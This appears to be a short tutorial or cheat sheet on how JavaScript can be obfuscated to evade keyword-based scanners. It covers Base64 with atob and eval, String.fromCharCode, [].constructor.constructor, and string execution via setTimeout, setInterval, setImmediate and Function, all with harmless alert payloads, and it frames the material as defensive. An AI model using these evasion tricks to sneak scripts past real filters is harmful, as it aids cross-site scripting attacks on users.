# Base64 Encoding Evasion



## What is Base64 encoding?

#### Base64 is a way of encoding data (such as text or code) in a way that makes it transmittable across systems that do not handle certain special codes well. The text is converted into a string of characters consisting only of numbers, uppercase and lowercase letters, and some other symbols.

### Scenario for clarification

#### Let's say we have a simple JavaScript code like:

```
alert("Hello, world!");
```

#### This code will be easily detected by scanning systems because it contains the keyword "alert".

#### We can encode this text using Base64. The ciphertext will be:


```
YWxlcnQoIkhlbGxvLCB3b3JsZCEiKTs=
```

### Then, in the JavaScript code, we can use a function to decode and run this text. The code will be as follows:

```
let encodedString = "YWxlcnQoIkhlbGxvLCB3b3JsZCEiKTs=";
let decodedString = atob(encodedString);
eval(decodedString);
```


------------

## Here we have an example of JavaScript code that includes a simple payload:


```
<script>
eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 72, 101, 108, 108, 111, 33, 39, 41));
</script>
```

#### This code converts a set of numbers (which represent ```ASCII codes```) into text, and then uses the eval function to execute the resulting text. The resulting text here is:

```
alert('Hello!');
```


-----------

### Use ```[].constructor.constructor``` to parse and run JavaScript code

Code:

```
[].constructor.constructor("code")()
```

####Such as:

```
[].constructor.constructor("alert('Hello, world!')")()
```

### Equivalent to:

```
new Function("alert('Hello, world!')")()
```














--------


## Other valid methods are:

▪ setTimeout("code") #all browsers

▪ setInterval("code") #all browsers

▪ setImmediate("code") #IE 10+

▪ Function("code")() #all browsers



## 1. setTimeout("code")

##### It is used to execute the code after a certain period of time (in milliseconds). Example:


```
setTimeout("alert('Hello, world!')", 1000);
```

# 2. setInterval("code")

##### It is used to execute the code periodically every specified period of time. Example:


```
setInterval("alert('Hello, world!')", 2000);
```

# 3. setImmediate("code")

##### It is used to execute the code immediately after the current cycle of events completes. Only available in ```Internet Explorer 10+``` and other browsers that support it. Example:


```
setImmediate("alert('Hello, world!')");
```


# 4.Function("code"))()

##### Creates a new function from the string and executes it immediately. Example:


```
Function("alert('Hello, world!')")();
```
--------

### Important note

##### These methods are sometimes used by attackers to execute malicious code in a way that is not easily detected by scanning systems. You must understand these methods to use them in cyber defense and learn how to protect applications from them.







































